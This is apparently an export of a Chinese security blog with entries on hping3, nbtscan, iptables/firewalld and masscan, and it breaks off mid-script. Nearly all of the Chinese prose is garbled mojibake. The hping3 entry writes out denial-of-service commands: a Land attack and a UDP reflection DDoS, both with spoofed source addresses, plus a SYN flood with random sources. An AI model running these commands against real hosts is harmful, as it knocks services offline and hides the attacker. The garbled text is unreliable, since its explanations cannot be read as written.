è°ƒè¯•ä¿¡æ¯ -z --bind ç»‘å®šctrl+zåˆ°ttl(é»˜è®¤ä¸ºç›®çš„ç«¯å£) -Z --unbind å–æ¶ˆç»‘å®šctrl+zé”® --beep å¯¹äºæ¥æ”¶åˆ°çš„æ¯ä¸ªåŒ¹é…æ•°æ®åŒ…èœ‚é¸£å£°æç¤º æ¨¡å¼é€‰æ‹© default mode TCP // é»˜è®¤æ¨¡å¼æ˜¯ TCP -0 --rawip RAWIPæ¨¡å¼ï¼ŒåŸå§‹IPæ¨¡å¼ã€‚åœ¨æ­¤æ¨¡å¼ä¸‹HPINGä¼šå‘é€å¸¦æ•°æ®çš„IPå¤´ã€‚å³è£¸IPæ–¹å¼ã€‚ä½¿ç”¨RAWSOCKETæ–¹å¼ã€‚ -1 --icmp ICMPæ¨¡å¼ï¼Œæ­¤æ¨¡å¼ä¸‹HPINGä¼šå‘é€IGMPåº”ç­”æŠ¥ï¼Œä½ å¯ä»¥ç”¨--ICMPTYPE --ICMPCODEé€‰é¡¹å‘é€å…¶ä»–ç±»å‹/æ¨¡å¼çš„ICMPæŠ¥æ–‡ã€‚ -2 --udp UDP æ¨¡å¼ï¼Œç¼ºçœä¸‹ï¼ŒHPINGä¼šå‘é€UDPæŠ¥æ–‡åˆ°ä¸»æœºçš„0ç«¯å£ï¼Œä½ å¯ä»¥ç”¨--baseport --destport --keepé€‰é¡¹æŒ‡å®šå…¶æ¨¡å¼ã€‚ -8 --scan SCAN mode. //æ‰«ææ¨¡å¼ æŒ‡å®šæ‰«æå¯¹åº”çš„ç«¯å£ã€‚ Example: hping --scan 1-30,70-90 -S www.target.host // æ‰«æ -9 --listen listen mode // ç›‘å¬æ¨¡å¼ IP æ¨¡å¼ -a --spoof spoof source address //æºåœ°å€æ¬ºéª—ã€‚ä¼ªé€ IPæ”»å‡»ï¼Œé˜²ç«å¢™å°±ä¸ä¼šè®°å½•ä½ çš„çœŸå®IPäº†ï¼Œå½“ç„¶å›åº”çš„åŒ…ä½ ä¹Ÿæ¥æ”¶ä¸åˆ°äº†ã€‚ --rand-dest random destionation address mode. see the man. // éšæœºç›®çš„åœ°å€æ¨¡å¼ã€‚è¯¦ç»†ä½¿ç”¨ man å‘½ä»¤ --rand-source random source address mode. see the man. // éšæœºæºåœ°å€æ¨¡å¼ã€‚è¯¦ç»†ä½¿ç”¨ man å‘½ä»¤ -t --ttl ttl (é»˜è®¤ 64) //ä¿®æ”¹ ttl å€¼ -N --id id (é»˜è®¤ éšæœº) // hping ä¸­çš„ ID å€¼ï¼Œç¼ºçœä¸ºéšæœºå€¼ -W --winid ä½¿ç”¨win* idå­—èŠ‚é¡ºåº //ä½¿ç”¨winidæ¨¡å¼ï¼Œé’ˆå¯¹ä¸åŒçš„æ“ä½œç³»ç»Ÿã€‚UNIX ,WINDIWSçš„idå›åº”ä¸åŒçš„ï¼Œè¿™é€‰é¡¹å¯ä»¥è®©ä½ çš„IDå›åº”å’ŒWINDOWSä¸€æ ·ã€‚ -r --rel ç›¸å¯¹idå­—æ®µ(ä¼°è®¡ä¸»æœºæµé‡) //æ›´æ”¹IDçš„ï¼Œå¯ä»¥è®©IDæ›¾é€’å‡è¾“å‡ºï¼Œè¯¦è§HPING-HOWTOã€‚ -f --frag æ‹†åˆ†æ•°æ®åŒ…æ›´å¤šçš„frag. (may pass weak acl) //åˆ†æ®µï¼Œå¯ä»¥æµ‹è¯•å¯¹æ–¹æˆ–è€…äº¤æ¢æœºç¢ç‰‡å¤„ç†èƒ½åŠ›ï¼Œç¼ºçœ16å­—èŠ‚ã€‚ -x --morefrag è®¾ç½®æ›´å¤šçš„åˆ†æ®µæ ‡å¿— // å¤§é‡ç¢ç‰‡ï¼Œæ³ªæ»´æ”»å‡»ã€‚ -y --dontfrag è®¾ç½®ä¸åˆ†æ®µæ ‡å¿— // å‘é€ä¸å¯æ¢å¤çš„IPç¢ç‰‡ï¼Œè¿™å¯ä»¥è®©ä½ äº†è§£æ›´å¤šçš„MTU PATH DISCOVERYã€‚ -g --fragoff set the fragment offset // è®¾ç½®æ–­åç§»ã€‚ -m --mtu è®¾ç½®è™šæ‹Ÿæœ€å¤§ä¼ è¾“å•å…ƒ, implies --frag if packet size > mtu // è®¾ç½®è™šæ‹ŸMTUå€¼ï¼Œå½“å¤§äºmtuçš„æ—¶å€™åˆ†æ®µã€‚ -o --tos type of service (default 0x00), try --tos help // toså­—æ®µï¼Œç¼ºçœ0x00ï¼Œå°½åŠ›è€Œä¸ºï¼Ÿ -G --rroute includes RECORD_ROUTE option and display the route buffer // è®°å½•IPè·¯ç”±ï¼Œå¹¶æ˜¾ç¤ºè·¯ç”±ç¼“å†²ã€‚ --lsrr æ¾æ•£æºè·¯ç”±å¹¶è®°å½•è·¯ç”± // æ¾æ•£æºè·¯ç”± --ssrr ä¸¥æ ¼æºè·¯ç”±å¹¶è®°å½•è·¯ç”± // ä¸¥æ ¼æºè·¯ç”± -H --ipproto è®¾ç½®IPåè®®å­—æ®µï¼Œä»…åœ¨RAW IPæ¨¡å¼ä¸‹ä½¿ç”¨ //åœ¨RAW IPæ¨¡å¼é‡Œé€‰æ‹©IPåè®®ã€‚è®¾ç½®ipåè®®åŸŸï¼Œä»…åœ¨RAW ipæ¨¡å¼ä½¿ç”¨ã€‚ ICMP æ¨¡å¼ -C --icmptype icmpç±»å‹(é»˜è®¤echoè¯·æ±‚) // ICMPç±»å‹ï¼Œç¼ºçœå›æ˜¾è¯·æ±‚ã€‚ -K --icmpcode icmpä»£å·(é»˜è®¤0) // ICMPä»£ç ã€‚ --force-icmp å‘é€æ‰€æœ‰icmpç±»å‹(é»˜è®¤ä»…å‘é€æ”¯æŒçš„ç±»å‹) // å¼ºåˆ¶ICMPç±»å‹ã€‚ --icmp-gw è®¾ç½®ICMPé‡å®šå‘ç½‘å…³åœ°å€(é»˜è®¤0.0.0.0) // ICMPé‡å®šå‘ --icmp-ts ç­‰åŒ --icmp --icmptype 13 (ICMP æ—¶é—´æˆ³) // icmpæ—¶é—´æˆ³ --icmp-addr ç­‰åŒ --icmp --icmptype 17 (ICMP åœ°å€å­ç½‘æ©ç ) // icmpå­ç½‘åœ°å€ --icmp-help æ˜¾ç¤ºå…¶ä»–icmpé€‰é¡¹å¸®åŠ© // ICMPå¸®åŠ© UDP/TCP æ¨¡å¼ -s --baseport base source port (default random) // ç¼ºçœéšæœºæºç«¯å£ -p --destport [+][+]&lt;port> destination port(default 0) ctrl+z inc/dec // ç¼ºçœéšæœºæºç«¯å£ -k --keep keep still source port // ä¿æŒæºç«¯å£ -w --win winsize (default 64) // winçš„æ»‘åŠ¨çª—å£ã€‚windowså‘é€å­—èŠ‚(é»˜è®¤64) -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) // è®¾ç½®ä¼ªé€ tcpæ•°æ®åç§»é‡(å–ä»£tcpåœ°å€é•¿åº¦é™¤4) -Q --seqnum shows only tcp sequence number // ä»…æ˜¾ç¤ºtcpåºåˆ—å· -b --badcksum (å°è¯•)å‘é€å…·æœ‰é”™è¯¯IPæ ¡éªŒå’Œæ•°æ®åŒ…ã€‚è®¸å¤šç³»ç»Ÿå°†ä¿®å¤å‘é€æ•°æ®åŒ…çš„IPæ ¡éªŒå’Œã€‚æ‰€ä»¥ä½ ä¼šå¾—åˆ°é”™è¯¯UDP/TCPæ ¡éªŒå’Œã€‚ -M --setseq è®¾ç½®TCPåºåˆ—å· -L --setack è®¾ç½®TCPçš„ack ------------------------------------- (ä¸æ˜¯ TCP çš„ ACK æ ‡å¿—ä½) -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag ------------------------------------- ï¼ˆè®¾ç½® TCP çš„ ACK æ ‡å¿— ä½ï¼‰ -U --urg set URG flag // ä¸€å¤§å †IPæŠ±å¤´çš„è®¾ç½®ã€‚ -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode ä½¿ç”¨last tcp-> th_flagsä½œä¸ºé€€å‡ºç  --tcp-mss å¯ç”¨å…·æœ‰ç»™å®šå€¼çš„TCP MSSé€‰é¡¹ --tcp-timestamp å¯ç”¨TCPæ—¶é—´æˆ³é€‰é¡¹æ¥çŒœæµ‹HZ/uptime Common //é€šç”¨è®¾ç½® -d --data data size (default is 0) // å‘é€æ•°æ®åŒ…å¤§å°ï¼Œç¼ºçœæ˜¯0ã€‚ -E --file æ–‡ä»¶æ•°æ® -e --sign æ·»åŠ â€œç­¾åâ€ -j --dump è½¬å‚¨ä¸ºåå…­è¿›åˆ¶æ•°æ®åŒ… -J --print è½¬å‚¨ä¸ºå¯æ‰“å°å­—ç¬¦ -B --safe å¯ç”¨â€œå®‰å…¨â€åè®® -u --end å‘Šè¯‰ä½ ä»€ä¹ˆæ—¶å€™--fileè¾¾åˆ°EOFå¹¶é˜²æ­¢å€’å› -T --traceroute tracerouteæ¨¡å¼(ç­‰åŒä½¿ç”¨ --bind ä¸”--ttl 1) --tr-stop åœ¨tracerouteæ¨¡å¼ä¸‹æ”¶åˆ°ç¬¬ä¸€ä¸ªä¸æ˜¯ICMPæ—¶é€€å‡º --tr-keep-ttl ä¿æŒæºTTLå›ºå®šï¼Œä»…ç”¨äºç›‘è§†ä¸€è·³ --tr-no-rtt ä¸è¦åœ¨è·Ÿè¸ªè·¯ç”±æ¨¡å¼ä¸‹è®¡ç®—/æ˜¾ç¤ºRTTä¿¡æ¯ ARSåŒ…æè¿°ï¼ˆæ–°å¢åŠŸèƒ½ï¼Œä¸ç¨³å®šï¼‰ ARS packet description (new, unstable) --apd-send å‘é€APDæè¿°æ•°æ®åŒ…(å‚è§docs / APD.txt) å¸¸ç”¨æ¨¡å¼ -0 --rawip # IPåŸå§‹æŠ¥æ–‡ -1 --icmp # ICMPæ¨¡å¼ -2 --udp # UDPæ¨¡å¼ -8 --scan # æ‰«ææ¨¡å¼ -9 --listen # ç›‘å¬æ¨¡å¼ å¸¸ç”¨æ–¹å¼## SYNæ–¹å¼æ‰«æä¸»æœºç«¯å£ hping --scan 1-30,70-90 -S www.target.host hping --scan 445,135 -S 192.168.0.110 #ç›®æ ‡ä¸»æœºå›å¤çš„ 'S..A'ï¼Œä»£è¡¨SYN/ACK ## æµ‹è¯•é˜²ç«å¢™å¯¹ICMPåŒ…çš„ååº”ã€æ˜¯å¦æ”¯æŒtracerouteã€æ˜¯å¦å¼€æ”¾æŸä¸ªç«¯å£ã€å¯¹é˜²ç«å¢™è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»(DoS attack)ã€‚ #ä¾‹å¦‚ï¼Œä»¥LandAttackæ–¹ å¼æµ‹è¯•ç›®æ ‡é˜²ç«å¢™(Land Attackæ˜¯å°†å‘é€æºåœ°å€è®¾ç½®ä¸ºä¸ç›®æ ‡åœ°å€ç›¸åŒï¼Œè¯±ä½¿ç›®æ ‡æœºä¸è‡ªå·±ä¸åœåœ°å»ºç«‹è¿æ¥)ã€‚ # -a ä¼ªé€ æºåœ°å€ hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c ## DRDDOS(UDPåå°„DDoSæ”»å‡») -cå‘åŒ…çš„æ•°é‡ hping3 --udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5 ä½¿ç”¨hping3è¿›è¡Œflood DoSæ”»å‡»ï¼š hping3 -c 5000 -d 150 -S -w 64 -p 80 --flood &lt;10.0.40.246> -cï¼šå‘é€æ•°æ®åŒ…çš„ä¸ªæ•° -dï¼šæ¯ä¸ªæ•°æ®åŒ…çš„å¤§å° -Sï¼šå‘é€SYNæ•°æ®åŒ… -wï¼šTCP windowå¤§å° -pï¼šç›®æ ‡ç«¯å£ï¼Œä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ --floodï¼šå°½å¯èƒ½å¿«çš„å‘é€æ•°æ®åŒ… --rand-source :ä½¿ç”¨éšæœºçš„Source IP Addresses. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>hping3</tag>
        <tag>ç«¯å£æ‰«æ</tag>
        <tag>DDOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nbtscan]]></title>
    <url>%2Fposts%2F26997%2F</url>
    <content type="text"><![CDATA[å½“æˆ‘ä»¬å¤„äºå±€åŸŸç½‘ä¸­ ç”¨æ¥æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº kaliä¸­å·²ç»å®‰è£…äº†ï¼š root@xps:~# whereis nbtscan nbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz root@xps:~# nbtscan NBTscan version 1.6. This is a free software and it comes with absolutely no warranty. You can use, distribute and modify it under terms of GNU GPL 2+. Usage: nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range>) -v verbose output. Print all names received from each host -d dump packets. Print whole packet contents. -e Format output in /etc/hosts format. -l Format output in lmhosts format. Cannot be used with -v, -s or -h options. -t timeout wait timeout milliseconds for response. Default 1000. -b bandwidth Output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that ougoing queries don't get dropped. -r use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix. -q Suppress banners and error messages, -s separator Script-friendly output. Don't print column and record headers, separate fields with separator. -h Print human-readable names for services. Can only be used with -v option. -m retransmits Number of retransmits. Default 0. -f filename Take IP addresses to scan from file filename. -f - makes nbtscan take IP addresses from stdin. &lt;scan_range> what to scan. Can either be single IP like 192.168.1.1 or range of addresses in one of two forms: xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. Examples: nbtscan -r 192.168.1.0/24 Scans the whole C-class network. nbtscan 192.168.1.25-137 Scans a range from 192.168.1.25 to 192.168.1.137 nbtscan -v -s : 192.168.1.0/24 Scans C-class network. Prints results in script-friendly format using colon as field separator. Produces output like that: 192.168.0.1:NT_SERVER:00U 192.168.0.1:MY_DOMAIN:00G 192.168.0.1:ADMINISTRATOR:03U 192.168.0.2:OTHER_BOX:00U ... nbtscan -f iplist Scans IP addresses specified in file iplist. # å‚æ•° -a åˆ—å‡ºä¸ºå…¶ä¸»æœºåæä¾›çš„è¿œç¨‹è®¡ç®—æœºåå­—è¡¨ã€‚ -A åˆ—å‡ºä¸ºå…¶IPåœ°å€æä¾›çš„è¿œç¨‹è®¡ç®—æœºåå­—è¡¨ã€‚ -c åˆ—å‡ºåŒ…æ‹¬äº†IPåœ°å€çš„è¿œç¨‹åå­—é«˜é€Ÿç¼“å­˜å™¨ã€‚ -n åˆ—å‡ºæœ¬åœ°NetBIOSåå­—ã€‚ -r åˆ—å‡ºé€šè¿‡å¹¿æ’­å’ŒWINSè§£æçš„åå­—ã€‚ -R æ¶ˆé™¤å’Œé‡æ–°åŠ è½½è¿œç¨‹é«˜é€Ÿç¼“å­˜å™¨åå­—è¡¨ã€‚ -S åˆ—å‡ºæœ‰ç›®çš„åœ°IPåœ°å€çš„ä¼šè¯è¡¨ã€‚ -s åˆ—å‡ºä¼šè¯è¡¨å¯¹è¯ã€‚ ç¤ºä¾‹## ä»¥ï¼šåˆ†å‰²æ˜¾ç¤º ## Linuxä¸Š nbtscan -v -s : 192.168.117.130 # æ‰«ææ•´ä¸ªCæ®µ nbtscan -r 192.168.1.0/24 # æ‰«æä¸€ä¸ªèŒƒå›´ nbtscan 192.168.1.25-137 # ä»æ–‡ä»¶è¯»å–æ‰«æèŒƒå›´ nbtscan -f &lt;File> ## Windowsä¸Š nbtscan.exe -m 192.168.1.0/24 é«˜çº§ç”¨æ³•nbtscan -v -s ' ' 192.168.117.130 nbtscan -v -s ' ' 192.168.117.130 | awk '{print $1}' |uniq è¿™ä¸ªå·¥å…·çš„è¿è¡Œæµç¨‹ï¼šéå†è¾“å…¥çš„IPèŒƒå›´ï¼Œä»¥å¹¿æ’­MACåœ°å€å‘é€ARPæŸ¥è¯¢ï¼Œä¸€æ—¦æ¥æ”¶åˆ°ARPå›å¤ï¼Œéè®°å½•ç›¸åº”çš„IPä¸MACåœ°å€ï¼ŒåŒæ—¶å‘å¯¹æ–¹å‘é€NBNSæ¶ˆæ¯æŸ¥è¯¢å¯¹æ–¹çš„ä¸»æœºä¿¡æ¯æ‰“å°å‡ºæ¯æ¡ä¿¡æ¯ å…¶ä»–æ¢æµ‹å†…ç½‘ä¸»æœºçš„æ–¹æ³•ï¼šhttp://www.360doc.com/content/19/1129/18/13328254_876375955.shtml document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>nbtscan</tag>
        <tag>ä¸»æœºå­˜æ´»æ¢æµ‹</tag>
        <tag>ç½‘ç»œå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptablesåŒ…è¿‡æ»¤ä¸ç½‘ç»œåœ°å€è½¬æ¢]]></title>
    <url>%2Fposts%2F23022%2F</url>
    <content type="text"><![CDATA[iptablesåŠŸèƒ½4ä¸ªè¡¨rawå’Œmangleï¼Œnat,filterï¼ˆåä¸¤ä¸ªè¡¨ç”¨çš„å¤šï¼‰ iptables -t filter -nvL # -tæ˜¾ç¤ºå“ªä¸ªè¡¨ ä¸‰ä¸ªé“¾(Chain)ï¼šINPUT,FORAWRD(è½¬å‘è§„åˆ™é“¾),OUTPUT ç‰¹ç‚¹ æ¯”è¾ƒè€,é€æ¸è¢«å–ä»£ åŸºäºå‘½ä»¤è¡Œ éš¾åº¦æœ€é«˜ ç”¨æ³•iptables [-t è¡¨å] é€‰é¡¹ [é“¾å] [æ¡ä»¶] [-j æ§åˆ¶ç±»å‹] # æ³¨æ„äº‹é¡¹ï¼š ä¸æŒ‡å®šè¡¨åæ—¶ï¼Œé»˜è®¤æŒ‡filterè¡¨ ä¸æŒ‡å®šé“¾åæ—¶ï¼Œé»˜è®¤åªè¡¨å†…æ˜¯æ‰€æœ‰é“¾ é™¤éè®¾ç½®é“¾çš„é»˜è®¤ç­–ç•¥ã€‚å¦åˆ™å¿…é¡»æŒ‡å‘åŒ¹é…æ¡ä»¶ é€‰é¡¹ã€é“¾åã€æ§åˆ¶ç±»å‹ä½¿ç”¨å¤§å†™å­—æ¯ï¼Œå…¶ä½™å‡ä¸ºå°å†™ å‡ ç§æ§åˆ¶ç±»å‹ ACCEPT # å…è®¸æµé‡é€šè¿‡ REJECT # æ˜ç¡®æ‹’ç»(æ¯”å¦‚pingæ—¶å€™çš„"ä¸»æœºä¸å¯è¾¾") DROP # å¯¹æ–¹ä¸çŸ¥é“ä½ æ˜¯å¦åœ¨çº¿(æ˜¾ç¤ºè¶…æ—¶) LOG # è®°å½•æ—¥å¿—ä¿¡æ¯ è§„åˆ™ä¼˜å…ˆé¡ºåºï¼šè‡ªä¸Šè€Œä¸‹ åŒ…è¿‡æ»¤ç”¨æ³• iptables -L # æ˜¾ç¤ºæ‰€æœ‰çš„ç­–ç•¥ iptables -F # "æ¸…ç©ºæ‰€æœ‰"ç­–ç•¥ iptables -F FORWARD # æ¸…ç©ºFORWARDè¡¨æ‰€æœ‰è§„åˆ™ iptables -P INPUT DROP # é»˜è®¤ç¦æ­¢æ‰€æœ‰æµé‡ç­–ç•¥,ä¸èƒ½reject ## å‚æ•° -I # æ’å…¥åˆ°æœ€å‰é¢(ç”¨çš„è¾ƒå¤š) -A # æ’å…¥åˆ°æœ€åé¢(ç”¨çš„è¾ƒå°‘) -D # åˆ é™¤ -p # å…è®¸çš„åè®® --dport # æœ¬æœºç«¯å£ï¼ˆå±äºéšå«åŒ¹é…ï¼Œè¦é…åˆé€šç”¨åŒ¹é…ä½¿ç”¨ï¼‰ -s # æ¥æºåœ°å€ -d # ç›®çš„åœ°å€ -i # å…¥ç«™ç½‘å¡ -o # å‡ºç«™ç½‘å¡ -j # æœ¬èº«ä¸ºæ„ä¹‰ï¼Œåé¢è·ŸåŠ¨ä½œ -L # åˆ—å‡ºæ‰€æœ‰è§„åˆ™æ¡ç›® -n: # ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€ã€ç«¯å£ç­‰ä¿¡æ¯ -v: # ä»¥æ›´è¯¦ç»†çš„æ–¹å¼æ˜¾ç¤ºè§„åˆ™ä¿¡æ¯ --lines-numbers: # æŸ¥çœ‹è§„åˆ™æ—¶ï¼Œæ˜¾ç¤ºè§„åˆ™çš„åºå· -mac-source MACåœ°å€ # MACåœ°å€åŒ¹é…ï¼ˆå±äºæ˜¾å¼åŒ¹é…ï¼‰ iptables -I INPUT -p icmp -j ACCEPT #åªå…è®¸å¤–éƒ¨åˆ°å†…éƒ¨çš„ping iptables -I INPUT -s 192.168.10.0/24 -d 0.0.0.0 -p tcp --dport 22 #å…è®¸æ¥è‡ªæŸä¸ªç½‘æ®µçš„è®¿é—®ï¼Œç«¯å£ä¸º22 -D #åˆ é™¤æŸä¸€æ¡ iptables -D INPUT 1 #åˆ é™¤ç¬¬ä¸€æ¡(åé¢è·Ÿè¡Œå·) iptables -I INPUT -p tcp --port 22 -j REJECT #ç¦æ­¢å¤–éƒ¨æ‰€æœ‰22ç«¯å£çš„æµé‡ iptables -I INPUT -p tcp --port 22:200 -j REJECT #ç¦æ­¢å¤–éƒ¨æ‰€æœ‰20åˆ°200ç«¯å£çš„æµé‡ # ä¿å­˜è§„åˆ™ï¼ˆæ°¸ä¹…ç”Ÿæ•ˆï¼‰ service iptables save # å¯¼å‡ºå½“å‰è§„åˆ™çŠ¶æ€ iptables-save > /usr/share/1.txt # ä»æ–‡ä»¶å¯¼å…¥è§„åˆ™ iptables-restore &lt; /usr/share/1.txt ç½‘ç»œåœ°å€è½¬æ¢(NAT) NATè¡¨ # æŸ¥çœ‹NATè¡¨è§„åˆ™ iptables -t nat -nvL è·¯ç”±åè§„åˆ™ï¼ˆPOSTROUTINGï¼‰ ## è®¾ç½®è§„åˆ™ # -s æ˜¯ç»™å†…ç½‘çš„è°åšè½¬æ¢, --to-sourceæ˜¯è½¬ä¸ºç½‘å…³çš„åœ°å€ iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source 12.34.56.78 # å¦‚æœç½‘å…³åœ°å€æ˜¯åŠ¨æ€çš„ï¼Œå°±è¿™æ · iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source -j MASQUERADE ## é…ç½®FORWARDé“¾çš„è½¬å‘é™åˆ¶ ç›®æ ‡åœ°å€è½¬æ¢(DNAT) æƒ…æ™¯ï¼šå¤–ç½‘æœºå™¨è®¿é—®å†…ç½‘æœºå™¨ ä½¿ç”¨é“¾ï¼šè·¯ç”±å‰è§„åˆ™ï¼ˆPREROUTINGï¼‰ # æŸ¥çœ‹NATè¡¨è§„åˆ™ iptables -t nat -nvL # è®¾ç½®è§„åˆ™ï¼Œè®¿é—®å†…ç½‘ä¸»æœºçš„8080ç«¯å£ï¼ˆç½‘å…³çš„80æ˜ å°„åˆ°å†…ç½‘ä¸»æœºçš„8080ï¼‰ iptables -t nat PREROUTING -i eth1 -d 12.34.56.78 -p tcp --dport 80 -J DNAT --to-destination 192.168.1.1:8080 firewalld é˜²ç«å¢™zone #åŒºåŸŸ sbit #å®‰å…¨ä½ public #é»˜è®¤ç­–ç•¥,å½“å‰ä½¿ç”¨ Runtime # å½“å‰ç”Ÿæ•ˆï¼Œé‡å¯åå¤±æ•ˆ Premanent # å½“å‰æš‚æ—¶ä¸ç”Ÿæ•ˆï¼Œä½†æ˜¯æ°¸ä¹…ç”Ÿæ•ˆ --premanent # å»ºè®®æ·»åŠ è¿™ä¸ª firewall-cmd -reload #é‡å¯ firewall-cmd --get-default-zone #æŸ¥çœ‹å½“å‰åŒºåŸŸ firewall-cmd --set-default-zone=drop #åˆ‡æ¢é»˜è®¤åŒºåŸŸåˆ°ä¸¢åŒ… firewall-cmd --permanent --zone=drop --change-interface=en0167777 #é‡å¯ä¹‹åï¼ŒæŠŠè¿™ä¸ªç½‘å¡åŒºåŸŸæ¢ä¸ºdrop firewall-cmd --permanent get-zone-of-interface=en0167777 #é‡å¯ä¹‹åï¼ŒæŸ¥çœ‹ ##ç´§æ€¥æ¨¡å¼ firewall-cmd --panic-on #åˆ‡æ–­æ‰€æœ‰ç½‘ç»œè¿æ¥ï¼ŒåŒ…æ‹¬pingçš„æ•°æ®åŒ… firewall-cmd --panic-off #å…³é—­ç´§æ€¥æ¨¡å¼ ##æŸ¥è¯¢æœåŠ¡ firewall-cmd --zone=public --query-service=http #æŸ¥çœ‹æ˜¯å¦å…è®¸http firewall-cmd --zone=public --query-service=ssh ##æ·»åŠ å…è®¸æœåŠ¡ firewall-cmd --zone=public --add-servcice=http #å…è®¸ä»å¤–è®¿é—®httpæœåŠ¡ firewall-cmd --zone=public --add-servcice=https #é‡å¯æ‰å¯ä»¥ firewall-cmd --reload firewall-cmd --zone=public --add-servcice=https ##ç¦æ­¢æœåŠ¡ firewall-cmd --zone=public --remove-servcice=https firewall-cmd --permanent --zone=public --add-servcice=https firewall-cmd --permanent --zone=public --query-servcice=https ##æ·»åŠ ç«¯å£å· firewall-cmd --zone=public --add-port=8080/tcp #æŠŠè¿™ä¸ªç«¯å£æ·»åŠ åˆ°tcpåè®®ç»„ï¼Œå…è®¸ firewall-cmd --zone=public --add-port=80-90/tcp #ç«¯å£ç«¯ ##ç«¯å£è½¬å‘ï¼ˆéšè—åŸå§‹ç«¯å£ï¼‰ firewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #è½¬å‘888åˆ°22 firewall-cmd --reload ##å¤è§„åˆ™ï¼ˆå¤è§„åˆ™ï¼‰ ##ç²¾å‡†åŒ¹é… firewall-cmd --permanent --zone=public --add-rich-rule="rule family"="ipv4" source address="192.168.10.0/24" service name="ssh" reject" firewall-cmd reload document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>é˜²ç«å¢™</tag>
        <tag>iptables</tag>
        <tag>NAT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[masscan]]></title>
    <url>%2Fposts%2F39667%2F</url>
    <content type="text"><![CDATA[masscanå·ç§°æ˜¯ä¸–ç•Œä¸Šæœ€å¿«çš„æ‰«æè½¯ä»¶ï¼Œå¯ä»¥åœ¨3åˆ†é’Ÿå†…æ‰«ææ•´ä¸ªäº’è”ç½‘ç«¯å£ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯ç”±æ¡ä»¶çš„4æ ¸ç”µè„‘ï¼ŒåŒç«¯å£10Gç½‘å¡ é¡¹ç›®åœ°å€ï¼š https://github.com/robertdavidgraham/masscan å®‰è£…Linuxä¸Šsudo apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make Windowsä¸Šå› ä¸ºæˆ‘ç”¨çš„Linuxæ¯”è¾ƒå¤šï¼Œæ‰€ç”¨æ²¡å®‰è¿‡Windowsçš„ï¼Œè¯·å‚è€ƒï¼šhttps://www.cnblogs.com/flaray/p/11213730.html ä½¿ç”¨å¸¸ç”¨å‘½ä»¤masscan 172.16.0.0/16 -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # æ‰«æipåˆ—è¡¨æ–‡ä»¶ masscan -iL ip.txt -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # è¾“å‡ºjsonæ ¼å¼ -Oj masscan -iL ip.txt -p80,443,3306 --banners --append-output -oJ result.json --max-rate 10000 # Note: å‘åŒ…é€Ÿç‡(--max-rate)ä¸è¦å¤ªå¤§ï¼Œä¸”Linuxä¸‹æ¯”Windowsé€Ÿåº¦å¿« --adapter-ip # æŒ‡å®šå‘åŒ…çš„IPåœ°å€ --adapter-port # æŒ‡å®šå‘åŒ…çš„æºç«¯å£ --adapter-mac # æŒ‡å®šå‘åŒ…çš„æºMACåœ°å€ --router-mac # æŒ‡å®šç½‘å…³çš„MACåœ°å€ --exclude # IPåœ°å€èŒƒå›´é»‘åå•,é˜²æ­¢masscanæ‰«æ --excludefile # æŒ‡å®šIPåœ°å€èŒƒå›´é»‘åå•æ–‡ä»¶ --includefile,-iL # è¯»å–ä¸€ä¸ªèŒƒå›´åˆ—è¡¨è¿›è¡Œæ‰«æ --wait # æŒ‡å®šå‘é€å®ŒåŒ…ä¹‹åçš„ç­‰å¾…æ—¶é—´,é»˜è®¤ä¸º10ç§’ Pythonè„šæœ¬è§£æmasscanæ‰«æç»“æœ æ˜¯åŸºäºjsonè¾“å‡ºæ ¼å¼(-OJ)çš„ # Authorï¼šhttps://www.jianshu.com/p/b6edaa3acbbf import json from openpyxl import Workbook import xlsxwriter import socket def get_list(filepath): f = 